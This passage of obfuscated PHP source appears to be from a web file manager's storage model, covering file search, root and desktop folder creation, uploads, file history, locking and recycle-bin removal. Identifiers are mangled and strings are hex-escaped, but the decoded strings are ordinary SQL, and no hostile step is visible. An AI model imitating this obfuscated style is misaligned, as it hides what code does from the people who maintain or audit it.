array_to_keyvalue(array_filter_by_field($À‚Ûê¡á, $‘•ÈçÜü[413], $‘•ÈçÜü[89]), $‘•ÈçÜü[12], $‘•ÈçÜü[405]); $æîÙºÁ = array_merge($æîÙºÁ, array_to_keyvalue($À‚Ûê¡á, $‘•ÈçÜü[12], $‘•ÈçÜü[405])); if (!$®ûşÜØŒ) { return $æîÙºÁ; } $‹”«Úåæ = array($‘•ÈçÜü[500] => array($‘•ÈçÜü[7], $®ûşÜØŒ)); $À‚Ûê¡á = $this->field($‘•ÈçÜü[2065])->where($‹”«Úåæ)->limit($ô®é­ƒ)->select(); $æîÙºÁ = array_merge($æîÙºÁ, array_to_keyvalue($À‚Ûê¡á, $‘•ÈçÜü[12], $‘•ÈçÜü[405])); $æîÙºÁ = array_slice($æîÙºÁ, 0, $ô®é­ƒ); return $æîÙºÁ; } private function _listSearchBindPinyin($½ Ê„„ü, &$ˆñÉßË, &$é¬É²‘¢) { $Î•Ö¯„ =& $_SERVER[Æ š¦İÈ]; if (!isset($½ Ê„„ü[$Î•Ö¯„[1903]]) || !$½ Ê„„ü[$Î•Ö¯„[1903]]) { return; } if (!Input::check($½ Ê„„ü[$Î•Ö¯„[1903]], $Î•Ö¯„[315]) || strlen($½ Ê„„ü[$Î•Ö¯„[1903]]) < 2) { return; } $èã³ñ = "\x4c\105\x46\x54\x20\112\117\x49\116\40{$this->tablePrefix}\151\157\x5f\x73\x6f\165\x72\x63\145\137\x6d\x65\x74\141\x20\155\145\164\141\x20\157\x6e\40\x73\157\165\x72\x63\145\56\x73\157\x75\162\143\145\111\104\40\x3d\x20\x6d\x65\164\141\56\163\x6f\165\162\x63\x65\x49\x44"; $Õ›²¸Ş× = array(); $é¬É²‘¢ = str_replace(array($Î•Ö¯„[228], $Î•Ö¯„[53], $Î•Ö¯„[2066]), $Î•Ö¯„[12], $é¬É²‘¢); $é¬É²‘¢ = $Î•Ö¯„[438] . str_replace($Î•Ö¯„[50], $Î•Ö¯„[439], $é¬É²‘¢); $­“®Îì¯ = $ˆñÉßË[$Î•Ö¯„[32]]; unset($ˆñÉßË[$Î•Ö¯„[32]]); foreach ($ˆñÉßË as $÷€¯¯ŸÚ => $¯–‡äƒ–) { $Õ›²¸Ş×[$Î•Ö¯„[438] . $÷€¯¯ŸÚ] = $¯–‡äƒ–; } foreach ($­“®Îì¯ as $”ë´Ÿ) { $Õ›²¸Ş×[] = array($Î•Ö¯„[443] => $”ë´Ÿ, $Î•Ö¯„[991] => $Î•Ö¯„[1907], array($Î•Ö¯„[2067] => $”ë´Ÿ, $Î•Ö¯„[2068] => array($Î•Ö¯„[7], array($Î•Ö¯„[466], $Î•Ö¯„[465])))); } $this->join($èã³ñ); $ˆñÉßË = $Õ›²¸Ş×; } private function _parseSearchWhere($êŞ‘µ) { $ÈÙ²õÙõ =& $_SERVER[Æ š¦İÈ]; $Õ‚şõ® = array(); if (isset($êŞ‘µ[$ÈÙ²õÙõ[758]]) && $êŞ‘µ[$ÈÙ²õÙõ[758]]) { $Õ‚şõ®[$ÈÙ²õÙõ[86]] = array($ÈÙ²õÙõ[2069], $êŞ‘µ[$ÈÙ²õÙõ[758]]); } if (isset($êŞ‘µ[$ÈÙ²õÙõ[498]]) && $êŞ‘µ[$ÈÙ²õÙõ[498]]) { $Ğ²ı…·÷ = array($ÈÙ²õÙõ[2070], $êŞ‘µ[$ÈÙ²õÙõ[498]]); if ($Õ‚şõ®[$ÈÙ²õÙõ[86]]) { $Õ‚şõ®[$ÈÙ²õÙõ[86]] = array($Õ‚şõ®[$ÈÙ²õÙõ[86]], $Ğ²ı…·÷, $ÈÙ²õÙõ[2071]); } else { $Õ‚şõ®[$ÈÙ²õÙõ[86]] = $Ğ²ı…·÷; } } if (isset($êŞ‘µ[$ÈÙ²õÙõ[2063]]) && $êŞ‘µ[$ÈÙ²õÙõ[2063]] > 0) { $Õ‚şõ®[$ÈÙ²õÙõ[80]] = array($ÈÙ²õÙõ[2069], $êŞ‘µ[$ÈÙ²õÙõ[2063]]); } if (isset($êŞ‘µ[$ÈÙ²õÙõ[2064]]) && $êŞ‘µ[$ÈÙ²õÙõ[2064]]) { $Ğ²ı…·÷ = array($ÈÙ²õÙõ[2070], $êŞ‘µ[$ÈÙ²õÙõ[2064]]); if ($Õ‚şõ®[$ÈÙ²õÙõ[80]]) { $Õ‚şõ®[$ÈÙ²õÙõ[80]] = array($Õ‚şõ®[$ÈÙ²õÙõ[80]], $Ğ²ı…·÷, $ÈÙ²õÙõ[2071]); } else { $Õ‚şõ®[$ÈÙ²õÙõ[80]] = $Ğ²ı…·÷; } } if (isset($êŞ‘µ[$ÈÙ²õÙõ[596]]) && $êŞ‘µ[$ÈÙ²õÙõ[596]]) { $Õ‚şõ®[] = array($ÈÙ²õÙõ[456] => $êŞ‘µ[$ÈÙ²õÙõ[596]], $ÈÙ²õÙõ[454] => $êŞ‘µ[$ÈÙ²õÙõ[596]], $ÈÙ²õÙõ[991] => $ÈÙ²õÙõ[1907]); } if (isset($êŞ‘µ[$ÈÙ²õÙõ[415]]) && $êŞ‘µ[$ÈÙ²õÙõ[415]]) { $Ÿ÷£†ü“ = $êŞ‘µ[$ÈÙ²õÙõ[415]]; if ($Ÿ÷£†ü“ == $ÈÙ²õÙõ[79]) { $Õ‚şõ®[$ÈÙ²õÙõ[413]] = 1; } else { if ($Ÿ÷£†ü“ == $ÈÙ²õÙõ[2072]) { $Õ‚şõ®[$ÈÙ²õÙõ[413]] = 0; } else { if ($Ÿ÷£†ü“) { $Ÿ÷£†ü“ = is_array($Ÿ÷£†ü“) ? $Ÿ÷£†ü“ : explode($ÈÙ²õÙõ[50], $Ÿ÷£†ü“); $Õ‚şõ®[$ÈÙ²õÙõ[415]] = array($ÈÙ²õÙõ[421], $Ÿ÷£†ü“); $Õ‚şõ®[$ÈÙ²õÙõ[413]] = 0; } } } } $this->_parseSearchParent($êŞ‘µ, $Õ‚şõ®); if (isset($êŞ‘µ[$ÈÙ²õÙõ[1903]]) && trim($êŞ‘µ[$ÈÙ²õÙõ[1903]])) { $ø·íÆ¡› = trim($êŞ‘µ[$ÈÙ²õÙõ[1903]]); $…Ä—Œ¡ = explode($ÈÙ²õÙõ[53], $ø·íÆ¡›); if (strlen($ø·íÆ¡›) > 2 && (substr($ø·íÆ¡›, 0, 1) == $ÈÙ²õÙõ[119] && substr($ø·íÆ¡›, -1) == $ÈÙ²õÙõ[119]) || substr($ø·íÆ¡›, 0, 1) == $ÈÙ²õÙõ[58] && substr($ø·íÆ¡›, -1) == $ÈÙ²õÙõ[58]) { $ø·íÆ¡› = substr($ø·íÆ¡›, 1, -1); $…Ä—Œ¡ = array($ø·íÆ¡›); } $Õ‚şõ®[$ÈÙ²õÙõ[32]] = array(array($ÈÙ²õÙõ[546], $ÈÙ²õÙõ[1905] . $ø·íÆ¡› . $ÈÙ²õÙõ[1905])); if (count($…Ä—Œ¡) > 1) { $Õ‚şõ®[$ÈÙ²õÙõ[32]] = array(); foreach ($…Ä—Œ¡ as $³úØı™) { if (!trim($³úØı™)) { continue; } $Õ‚şõ®[$ÈÙ²õÙõ[32]][] = array($ÈÙ²õÙõ[546], $ÈÙ²õÙõ[1905] . trim($³úØı™) . $ÈÙ²õÙõ[1905]); } } } return $Õ‚şõ®; } private function _parseSearchParent($Æáîú’‰, &$âğ§¶„­) { $§áäŒÜÉ =& $_SERVER[Æ š¦İÈ]; if (!isset($Æáîú’‰[$§áäŒÜÉ[500]]) || !$Æáîú’‰[$§áäŒÜÉ[500]]) { return; } $íÆèò‚ = $this->pathInfo($Æáîú’‰[$§áäŒÜÉ[500]]); $š¹ÇÕÚ = $íÆèò‚[$§áäŒÜÉ[500]] . $§áäŒÜÉ[12] === $§áäŒÜÉ[192]; $ç“¯»øå = $íÆèò‚[$§áäŒÜÉ[414]] == $§áäŒÜÉ[517]; if ($íÆèò‚[$§áäŒÜÉ[534]] == $§áäŒÜÉ[535]) { $„º¾‘óÏ = $this->sourceInfo($Æáîú’‰[$§áäŒÜÉ[500]]); $íÆèò‚[$§áäŒÜÉ[523]] = $„º¾‘óÏ[$§áäŒÜÉ[523]]; } $âğ§¶„­[$§áäŒÜÉ[586]] = array($§áäŒÜÉ[546], $íÆèò‚[$§áäŒÜÉ[523]] . $Æáîú’‰[$§áäŒÜÉ[500]] . $§áäŒÜÉ[547]); $¤İĞûóî = isset($Æáîú’‰[$§áäŒÜÉ[1771]]) && in_array($§áäŒÜÉ[517], $Æáîú’‰[$§áäŒÜÉ[1771]]); if (!$¤İĞûóî || !$ç“¯»øå || !$š¹ÇÕÚ || !$íÆèò‚[$§áäŒÜÉ[416]]) { return; } if (!AuthModel::authCheckRoot($íÆèò‚[$§áäŒÜÉ[416]][$§áäŒÜÉ[417]])) { return; } $§ùÃƒÖƒ = $íÆèò‚[$§áäŒÜÉ[506]] . $§áäŒÜÉ[12]; if ($§ùÃƒÖƒ == $§áäŒÜÉ[89]) { unset($âğ§¶„­[$§áäŒÜÉ[586]]); $âğ§¶„­[$§áäŒÜÉ[414]] = self::TYPE_GROUP; return; } $—Á£‚ø = Model($§áäŒÜÉ[524])->groupChildrenAll($§ùÃƒÖƒ); $óûƒã = count($—Á£‚ø); if ($óûƒã <= 1) { return; } $ÈÊøÄ¸ = array($§áäŒÜÉ[500] => 0, $§áäŒÜÉ[414] => self::TYPE_GROUP, $§áäŒÜÉ[506] => array($§áäŒÜÉ[7], $—Á£‚ø)); $ô—†ïë¿ = $this->field($§áäŒÜÉ[2073])->where($ÈÊøÄ¸)->limit($óûƒã)->select(); $âğ§¶„­[$§áäŒÜÉ[586]] = array(); foreach ($ô—†ïë¿ as $Ü¯¯Ÿ¢ó) { $âğ§¶„­[$§áäŒÜÉ[586]][] = array($§áäŒÜÉ[546], $§áäŒÜÉ[533] . $Ü¯¯Ÿ¢ó[$§áäŒÜÉ[405]] . $§áäŒÜÉ[547]); } $âğ§¶„­[$§áäŒÜÉ[586]][] = $§áäŒÜÉ[1907]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($º¾Ü¦ËØ) { $’Ü½‘Ë® =& $_SERVER[Æ š¦İÈ]; $å¯ú¡å‹ = Model($’Ü½‘Ë®[515])->where(array($’Ü½‘Ë®[1635] => $º¾Ü¦ËØ))->find(); $éÓæ©Ş = $this->_mkdirRoot(SourceModel::TYPE_USER, $º¾Ü¦ËØ, $å¯ú¡å‹[$’Ü½‘Ë®[32]]); $this->userDesktopAdd($éÓæ©Ş); return $éÓæ©Ş; } public function userDesktopAdd($ùµ°Åæ) { $†©ÖíÕ =& $_SERVER[Æ š¦İÈ]; $úîÃ¨ = LNG($†©ÖíÕ[2074]); $ŠÖ³š¨‰ = $this->mkdir($ùµ°Åæ, $úîÃ¨); $this->metaSet($ŠÖ³š¨‰, $†©ÖíÕ[2075], $†©ÖíÕ[89]); $this->metaSet($ùµ°Åæ, $†©ÖíÕ[2076], $ŠÖ³š¨‰); } public function groupRootAdd($ŒŞûë”¡) { $Ò–¬¢¦× =& $_SERVER[Æ š¦İÈ]; $ã’©Ÿƒî = Model($Ò–¬¢¦×[524])->where(array($Ò–¬¢¦×[1899] => $ŒŞûë”¡))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ŒŞûë”¡, $ã’©Ÿƒî[$Ò–¬¢¦×[32]]); } public function systemRootPathAdd($õˆ±’¤) { if ($õˆ±’¤ != $_SERVER[Æ š¦İÈ][539]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $õˆ±’¤); } public function userRootRemove($ëìÎšøè) { $°ÃÂÓùÎ = $this->sourceRoot(SourceModel::TYPE_USER, $ëìÎšøè); if (!$°ÃÂÓùÎ) { return; } $this->remove($°ÃÂÓùÎ, !1); } public function groupRootRemove($²‰Ô·ó­) { $ ¶âú³ = $this->sourceRoot(SourceModel::TYPE_GROUP, $²‰Ô·ó­); if (!$ ¶âú³) { return; } $this->remove($ ¶âú³, !1); } private function _mkdirRoot($ÊÇ×ˆù‚, $‰×à¯˜œ, $ëô¹æ’ò) { $’Á¦¸˜ =& $_SERVER[Æ š¦İÈ]; $«ğ°Îã‡ = array($’Á¦¸˜[404] => 0, $’Á¦¸˜[582] => $ÊÇ×ˆù‚, $’Á¦¸˜[583] => $‰×à¯˜œ, $’Á¦¸˜[579] => 1, $’Á¦¸˜[584] => USER_ID, $’Á¦¸˜[585] => USER_ID, $’Á¦¸˜[580] => $’Á¦¸˜[12], $’Á¦¸˜[586] => $’Á¦¸˜[533], $’Á¦¸˜[432] => 0, $’Á¦¸˜[581] => 0, $’Á¦¸˜[470] => 0, $’Á¦¸˜[587] => $’Á¦¸˜[12]); if ($éå’Ëâ‡ = $this->where($«ğ°Îã‡)->find()) { return $éå’Ëâ‡[$’Á¦¸˜[405]]; } $Ü‹‘³‚Š = "\x4d\157\x64\145\154\x53\x6f\165\162\143\145\56\x6d\x6b\144\x69\x72\x52\157\157\x74\x2e{$ÊÇ×ˆù‚}\56{$‰×à¯˜œ}\x2e" . $ëô¹æ’ò; CacheLock::lock($Ü‹‘³‚Š); $«ğ°Îã‡[$’Á¦¸˜[32]] = $ëô¹æ’ò; $Á‰òÅÁ§ = $this->add($«ğ°Îã‡); $’Ñ÷ËÊÏ = array($’Á¦¸˜[588] => short_id($Á‰òÅÁ§)); $this->where(array($’Á¦¸˜[420] => $Á‰òÅÁ§))->save($’Ñ÷ËÊÏ); CacheLock::unlock($Ü‹‘³‚Š); return $Á‰òÅÁ§; } private function sourceRoot($µû¤†áİ, $ôÖ”Çšü, $€Œ¬‹¾„ = false) { $ƒ©ıˆà¶ =& $_SERVER[Æ š¦İÈ]; $ŸŸæíÌÀ = array($ƒ©ıˆà¶[404] => 0, $ƒ©ıˆà¶[582] => $µû¤†áİ, $ƒ©ıˆà¶[583] => $ôÖ”Çšü); if ($ÒÓø›ñ„ = $this->where($ŸŸæíÌÀ)->find()) { return $€Œ¬‹¾„ ? $ÒÓø›ñ„ : $ÒÓø›ñ„[$ƒ©ıˆà¶[405]]; } return !1; } public function sourceRootGroup($ƒ×ÜÕ§) { $£Óò¸¡Ì =& $_SERVER[Æ š¦İÈ]; if (is_string($ƒ×ÜÕ§)) { $ƒ×ÜÕ§ = array($ƒ×ÜÕ§); } $Šú¨ïÅø = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ƒ×ÜÕ§, $£Óò¸¡Ì[183]); $’Î»´÷ = array($£Óò¸¡Ì[366] => $Šú¨ïÅø, $£Óò¸¡Ì[363] => array($£Óò¸¡Ì[756] => count($ƒ×ÜÕ§))); $this->_listDataApply($’Î»´÷[$£Óò¸¡Ì[366]]); $this->_listMake($’Î»´÷); return array_to_keyvalue($’Î»´÷[$£Óò¸¡Ì[77]], $£Óò¸¡Ì[506]); } public function mkfile($ËØ¸˜ıË, $§ùˆ×Ú, $æÌ„–ã = '', $•¼‰²´‰ = REPEAT_RENAME) { $Çíâ½ª• =& $_SERVER[Æ š¦İÈ]; $„­¨¶ÇÈ = Model($Çíâ½ª•[605])->addFileByContent($æÌ„–ã, $§ùˆ×Ú); return $this->_createFileCall($ËØ¸˜ıË, $§ùˆ×Ú, $„­¨¶ÇÈ, $•¼‰²´‰, $Çíâ½ª•[1327]); } public function addFile($Óë¤øÉ, $ÁÅÁ£Êğ, $æ‘Ó³Ç, $ÌŸ¦›¯ = false, $ìš®¼× = REPEAT_RENAME) { $šÃ¥¨± = Model($_SERVER[Æ š¦İÈ][605])->addFile($ÁÅÁ£Êğ, $æ‘Ó³Ç, $ÌŸ¦›¯); return $this->_createFileCall($Óë¤øÉ, $æ‘Ó³Ç, $šÃ¥¨±, $ìš®¼×); } public function addFileByFileID($ÂÄÂ„µÂ, $ÂÁšøß†, $” Ã‹Â£, $‘İœ†„Ã = REPEAT_RENAME) { $œ­İÖ†¦ =& $_SERVER[Æ š¦İÈ]; $Å£­±‡ó = Model($œ­İÖ†¦[605])->find($ÂÁšøß†); Model($œ­İÖ†¦[605])->linkAdd($ÂÁšøß†); return $this->_createFileCall($ÂÄÂ„µÂ, $” Ã‹Â£, $Å£­±‡ó, $‘İœ†„Ã); } public function addFileByRemote($ªÕïş²Û, $ÓÇúÖğÕ, $ç·”‚Šò, $ƒ²¥†±† = array(), $ì”ü›òï = REPEAT_RENAME) { $Êïú¯Ë± = Model($_SERVER[Æ š¦İÈ][605])->addFileByRemote($ÓÇúÖğÕ, $ç·”‚Šò, $ƒ²¥†±†); return $this->_createFileCall($ªÕïş²Û, $ç·”‚Šò, $Êïú¯Ë±, $ì”ü›òï); } private function _createFileCall($Ï¦ŠÛÖã, $æ×à»¼², $¼ğÔ×™¨, $÷Ûà ’…, $ßåÍËâ… = "\x75\x70\x6c\x6f\x61\144") { $çú¼ÜÓ =& $_SERVER[Æ š¦İÈ]; $ÜËÒ—Şß = !1; $this->setMasterDB(); $this->lockWriteStart($Ï¦ŠÛÖã, $æ×à»¼²); $ãÍ® ºÛ = $this->fileNameExist($Ï¦ŠÛÖã, $æ×à»¼²); $ ˆúšû¡ = $this->_createFile($Ï¦ŠÛÖã, $æ×à»¼², $¼ğÔ×™¨, $÷Ûà ’…, $ÜËÒ—Şß); if (!$ÜËÒ—Şß) { Model($çú¼ÜÓ[472])->remove($¼ğÔ×™¨[$çú¼ÜÓ[469]]); } if ($ÜËÒ—Şß && $ ˆúšû¡ && $ ˆúšû¡ != $ãÍ® ºÛ) { Model($çú¼ÜÓ[2047])->eventCreate($ ˆúšû¡, $ßåÍËâ…); } $this->lockWriteEnd($Ï¦ŠÛÖã, $æ×à»¼²); return $ ˆúšû¡; } public function mkdir($áí””Ï, $Û¸í ìÆ, $¥ƒ¥–Êû = REPEAT_SKIP) { $»ËÊËÕ =& $_SERVER[Æ š¦İÈ]; $this->setMasterDB(); $¹ô½á¨‚ = $this->sourceInfo($áí””Ï); if (!$¹ô½á¨‚) { return !1; } $this->lockWriteStart($áí””Ï, $Û¸í ìÆ); if ($¥ƒ¥–Êû !== !1) { $«Ì¥‰ÏÔ = $this->fileNameExist($áí””Ï, $Û¸í ìÆ); if ($«Ì¥‰ÏÔ && $¥ƒ¥–Êû != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($áí””Ï, $Û¸í ìÆ); return $«Ì¥‰ÏÔ; } $Û¸í ìÆ = $this->fileNameAuto($áí””Ï, $Û¸í ìÆ, $¥ƒ¥–Êû); } $ŸÆÃŒğ = array($»ËÊËÕ[579] => 1, $»ËÊËÕ[423] => $Û¸í ìÆ, $»ËÊËÕ[580] => $»ËÊËÕ[12], $»ËÊËÕ[470] => 0, $»ËÊËÕ[581] => 0); $À”’Ú¸Ò = $this->_addSource($ŸÆÃŒğ, $¹ô½á¨‚); Model($»ËÊËÕ[2047])->eventCreate($À”’Ú¸Ò, $»ËÊËÕ[1328]); $this->lockWriteEnd($áí””Ï, $Û¸í ìÆ); return $À”’Ú¸Ò; } public function listSourceRoot($¤¢½ºä³, $ê²úõŒµ, $°Ş‚Ô¦ß = "\163\x6f\x75\x72\x63\x65\x49\104\x2c\164\x61\x72\147\x65\x74\111\x44\x2c\163\x69\172\x65") { $¿”ö€Ê¤ =& $_SERVER[Æ š¦İÈ]; $ÅüŞ«åŒ = $¿”ö€Ê¤[375]; $èŒÄÅ = array(); $›Š¡õ¡ = 1024 * 50; $İ‘óö³¦ = is_array($İ‘óö³¦) ? $İ‘óö³¦ : array(); $„Ò³…õ = count($ê²úõŒµ); $›‹Âçàì = $this->tablePrefix . $¿”ö€Ê¤[2077]; for ($ÁÕÇÔş® = 0; $ÁÕÇÔş® < $„Ò³…õ; $ÁÕÇÔş®++) { $‰÷Ü¢óä = $ê²úõŒµ[$ÁÕÇÔş®]; $ÅüŞ«åŒ .= "\x53\105\x4c\x45\x43\124\40\52\x20\x46\122\117\x4d\40\50\123\x45\x4c\x45\103\x54\40{$°Ş‚Ô¦ß}\x20\x46\122\x4f\115\x20\140{$›‹Âçàì}\140\x20\127\110\105\x52\105\40"; $ÅüŞ«åŒ .= "\140\160\141\162\145\156\164\111\x44\140\75\x30\x20\101\116\104\40\140\x74\x61\162\147\x65\x74\111\x44\140\75{$‰÷Ü¢óä}\x20\101\x4e\104\40\140\164\x61\162\147\145\164\x54\x79\x70\x65\x60\x3d{$¤¢½ºä³}\40\x6c\x69\x6d\151\x74\40\61\51\40\x61\x73\x20\x74\142\137{$ÁÕÇÔş®}\40\125\116\x49\117\x4e\x20\x41\x4c\114\x20"; if ((strlen($ÅüŞ«åŒ) >= $›Š¡õ¡ || $ÁÕÇÔş® == $„Ò³…õ - 1) && $ÅüŞ«åŒ) { $ÅüŞ«åŒ = substr($ÅüŞ«åŒ, 0, -strlen($¿”ö€Ê¤[1029])); $¿ÃÈÄê‹ = $this->query($ÅüŞ«åŒ); $ÅüŞ«åŒ = $¿”ö€Ê¤[12]; $èŒÄÅ = array_merge($èŒÄÅ, $¿ÃÈÄê‹); } } return $èŒÄÅ; } private function _createFile($›Åóß’ø, $×º¸¤‚È, $Ÿ¨•ÊşÇ, $…ñÔÙµ˜, &$Ü³¥İñÁ) { $¿×Ç£½ä =& $_SERVER[Æ š¦İÈ]; $õ¾ó™™Ş = $this->sourceInfo($›Åóß’ø); if (!$Ÿ¨•ÊşÇ || !$õ¾ó™™Ş) { return !1; } if ($…ñÔÙµ˜ !== !1) { $´Àéƒğ = $this->fileNameExist($›Åóß’ø, $×º¸¤‚È); } $Ü³¥İñÁ = !0; if ($…ñÔÙµ˜ && $´Àéƒğ) { if ($…ñÔÙµ˜ == REPEAT_SKIP) { $Ü³¥İñÁ = !1; return $´Àéƒğ; } else { if ($…ñÔÙµ˜ == REPEAT_REPLACE) { $÷½’şÈÔ = $this->sourceInfo($´Àéƒğ); $³¨ø»‰¼ = $this->fileHistory($÷½’şÈÔ, $Ÿ¨•ÊşÇ[$¿×Ç£½ä[469]], $Ÿ¨•ÊşÇ[$¿×Ç£½ä[80]]); if (!$³¨ø»‰¼) { $Ü³¥İñÁ = !1; } else { $this->folderSizeReset($›Åóß’ø); } return $´Àéƒğ; } else { $×º¸¤‚È = $this->fileNameAuto($›Åóß’ø, $×º¸¤‚È, $…ñÔÙµ˜, !1); } } } $Ã‡«çî = array($¿×Ç£½ä[579] => 0, $¿×Ç£½ä[423] => $×º¸¤‚È, $¿×Ç£½ä[580] => substr(get_path_ext($×º¸¤‚È), 0, 10), $¿×Ç£½ä[470] => $Ÿ¨•ÊşÇ[$¿×Ç£½ä[469]], $¿×Ç£½ä[581] => $Ÿ¨•ÊşÇ[$¿×Ç£½ä[80]]); $Õ·ë¶ÕË = $this->_addSource($Ã‡«çî, $õ¾ó™™Ş); $this->folderSizeReset($›Åóß’ø, intval($Ã‡«çî[$¿×Ç£½ä[80]])); return $Õ·ë¶ÕË; } protected function fileHistory($¯Ûå¶­, $İ¼³–ÔÒ, $¢èí¯Á) { $æí‰ÚÍÓ =& $_SERVER[Æ š¦İÈ]; $µ³Ìïş = defined($æí‰ÚÍÓ[476]) ? USER_ID : $æí‰ÚÍÓ[192]; if ($¯Ûå¶­[$æí‰ÚÍÓ[469]] == $İ¼³–ÔÒ) { return !1; } $this->checkLock($¯Ûå¶­[$æí‰ÚÍÓ[405]], $İ¼³–ÔÒ); Model($æí‰ÚÍÓ[2078])->addHistory($¯Ûå¶­); $¦öù±µ = array($æí‰ÚÍÓ[585] => $µ³Ìïş, $æí‰ÚÍÓ[427] => time(), $æí‰ÚÍÓ[469] => $İ¼³–ÔÒ, $æí‰ÚÍÓ[80] => $¢èí¯Á); $this->where(array($æí‰ÚÍÓ[420] => $¯Ûå¶­[$æí‰ÚÍÓ[405]]))->save($¦öù±µ); $this->sourceCacheClear($¯Ûå¶­[$æí‰ÚÍÓ[405]]); return !0; } public function checkLock($ÕÌÒ¼Á, $¬ÌËÏæ¥) { $Á£ñÅå =& $_SERVER[Æ š¦İÈ]; $‚Âª«Õ™ = $this->pathInfo($ÕÌÒ¼Á); if (!$this->fileIsLock($‚Âª«Õ™, !0)) { return; } $´Şğ«î³ = Session::get($Á£ñÅå[2079]); $ôÊß”êû = substr($‚Âª«Õ™[$Á£ñÅå[32]], 0, -1 - strlen($‚Âª«Õ™[$Á£ñÅå[169]])) . $Á£ñÅå[1593] . $´Şğ«î³ . $Á£ñÅå[10] . $‚Âª«Õ™[$Á£ñÅå[169]]; $‰¨Û•ÏŒ = Model($Á£ñÅå[605])->find($¬ÌËÏæ¥); $this->_createFileCall($‚Âª«Õ™[$Á£ñÅå[500]], $ôÊß”êû, $‰¨Û•ÏŒ, REPEAT_REPLACE, $Á£ñÅå[1327]); $•Å²ãÎ‚ = $‚Âª«Õ™[$Á£ñÅå[467]][$Á£ñÅå[544]]; $·üİ‘ñ„ = $•Å²ãÎ‚[$Á£ñÅå[2080]] ? $•Å²ãÎ‚[$Á£ñÅå[2080]] : $•Å²ãÎ‚[$Á£ñÅå[32]]; show_json(LNG($Á£ñÅå[2081]) . $Á£ñÅå[2082] . LNG($Á£ñÅå[2083]) . $Á£ñÅå[2084] . $·üİ‘ñ„ . $Á£ñÅå[2085], !1); } public function fileIsLock($­ê¨ö¦Š, $ïÜ°·“ = false) { $Œ”«ê¸› =& $_SERVER[Æ š¦İÈ]; if (!isset($­ê¨ö¦Š[$Œ”«ê¸›[467]]) || !$­ê¨ö¦Š[$Œ”«ê¸›[467]][$Œ”«ê¸›[541]]) { return !1; } if ($­ê¨ö¦Š[$Œ”«ê¸›[467]][$Œ”«ê¸›[541]] != USER_ID) { return !0; } $¾Ó¡–û¢ = $GLOBALS[$Œ”«ê¸›[6]][$Œ”«ê¸›[90]][$Œ”«ê¸›[542]]; if ($­ê¨ö¦Š[$Œ”«ê¸›[467]][$Œ”«ê¸›[543]] <= time() - $¾Ó¡–û¢) { $this->metaSet($­ê¨ö¦Š[$Œ”«ê¸›[405]], $Œ”«ê¸›[541], null); $this->metaSet($­ê¨ö¦Š[$Œ”«ê¸›[405]], $Œ”«ê¸›[543], null); } if ($ïÜ°·“) { $this->metaSet($­ê¨ö¦Š[$Œ”«ê¸›[405]], $Œ”«ê¸›[543], time()); } return !1; } private function _addSource($Å«º¡Ûœ, $·£¥°¸·) { $Û•İü¨õ =& $_SERVER[Æ š¦İÈ]; $¨ÛçİÈà = defined($Û•İü¨õ[476]) ? USER_ID : $Û•İü¨õ[192]; $âÕ×¦í’ = array($Û•İü¨õ[582] => $·£¥°¸·[$Û•İü¨õ[414]], $Û•İü¨õ[583] => $·£¥°¸·[$Û•İü¨õ[506]], $Û•İü¨õ[584] => $¨ÛçİÈà, $Û•İü¨õ[585] => $¨ÛçİÈà, $Û•İü¨õ[404] => $·£¥°¸·[$Û•İü¨õ[405]], $Û•İü¨õ[586] => $·£¥°¸·[$Û•İü¨õ[523]] . $·£¥°¸·[$Û•İü¨õ[405]] . $Û•İü¨õ[50], $Û•İü¨õ[432] => 0, $Û•İü¨õ[587] => $Û•İü¨õ[12]); $Å«º¡Ûœ = array_merge($âÕ×¦í’, $Å«º¡Ûœ); $this->updateModifyTime($Å«º¡Ûœ[$Û•İü¨õ[500]]); $ı£íüÕÇ = $Û•İü¨õ[2086] . $·£¥°¸·[$Û•İü¨õ[405]]; if (isset(self::$cacheChildList[$ı£íüÕÇ])) { unset(self::$cacheChildList[$ı£íüÕÇ]); } static $Äçëˆ¦— = false; if (!$Äçëˆ¦—) { Hook::trigger($Û•İü¨õ[569], $Å«º¡Ûœ); $Äçëˆ¦— = !0; } $§î­«†™ = $this->add($Å«º¡Ûœ); $¬ÎœÀœş = array($Û•İü¨õ[588] => short_id($§î­«†™)); $this->where(array($Û•İü¨õ[420] => $§î­«†™))->save($¬ÎœÀœş); $this->setNamePinyin($§î­«†™, $Å«º¡Ûœ[$Û•İü¨õ[32]]); return $§î­«†™; } public function remove($êèù¯İï, $É¯ıÛªš = true) { $õÂ’ä§¨ =& $_SERVER[Æ š¦İÈ]; $Õı¡ë®Ò = $this->sourceInfo($êèù¯İï); $ôŠõÏ´ñ = intval($Õı¡ë®Ò[$õÂ’ä§¨[414]]) === self::TYPE_SYSTEM; $÷œ³„šÆ = Model($õÂ’ä§¨[435])->get($õÂ’ä§¨[2087]) == $õÂ’ä§¨[89]; if ($ôŠõÏ´ñ || $É¯ıÛªš || !$÷œ³„šÆ) { return $this->removeNow($êèù¯İï, $É¯ıÛªš); } $Š‹°›ßÀ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ù“ÌÍŠ = $Õı¡ë®Ò[$õÂ’ä§¨[414]] == self::TYPE_USER ? $õÂ’ä§¨[596] : $õÂ’ä§¨[517]; if ($ù“ÌÍŠ == $õÂ’ä§¨[596]) { $ú±ã¸‚ = Model($õÂ’ä§¨[515])->getInfo($Õı¡ë®Ò[$õÂ’ä§¨[506]]); $»…ÀÕ¢ˆ = !empty($ú±ã¸‚[$õÂ’ä§¨[2080]]) ? $ú±ã¸‚[$õÂ’ä§¨[2080]] : $ú±ã¸‚[$õÂ’ä§¨[32]]; $»…ÀÕ¢ˆ = $õÂ’ä§¨[257] . $»…ÀÕ¢ˆ . $õÂ’ä§¨[2088] . $Õı¡ë®Ò[$õÂ’ä§¨[506]]; } else { $ú±ã¸‚ = Model($õÂ’ä§¨[524])->getInfo($Õı¡ë®Ò[$õÂ’ä§¨[506]]); $»…ÀÕ¢ˆ = _get($ú±ã¸‚, $õÂ’ä§¨[32]); $»…ÀÕ¢ˆ = $õÂ’ä§¨[161] . $»…ÀÕ¢ˆ . $õÂ’ä§¨[2089] . $Õı¡ë®Ò[$õÂ’ä§¨[506]]; } $Ã·ó¶¡© = $õÂ’ä§¨[2090] . md5($»…ÀÕ¢ˆ); 